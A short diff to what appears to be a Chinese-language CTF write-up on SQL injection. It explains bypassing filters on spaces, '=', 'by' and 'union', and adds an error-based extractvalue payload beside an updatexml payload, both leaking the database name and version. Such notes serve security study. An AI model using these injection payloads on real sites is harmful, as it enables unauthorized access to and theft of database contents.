@@ -365,7 +365,10 @@ echo serialize($a);
 用单引号搭配其他sql语句进行测试，发现空格，=，by，union被屏蔽掉了
 空格被屏蔽使用()来构造语句(一定要注意括号范围以及关系)
 等号被屏蔽使用like替代
-by,union被屏蔽则使用===报错注入===（updatexml,extractvalue等，使用方法一致）。
+by,union被屏蔽则使用===报错注入===（updatexml,extractvalue等）。
+```
+1'or(extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)))#
+```
 先获取数据库名：
 `1'or(updatexml(1,concat(0x7e,database()),1))#`
 再获取表名：
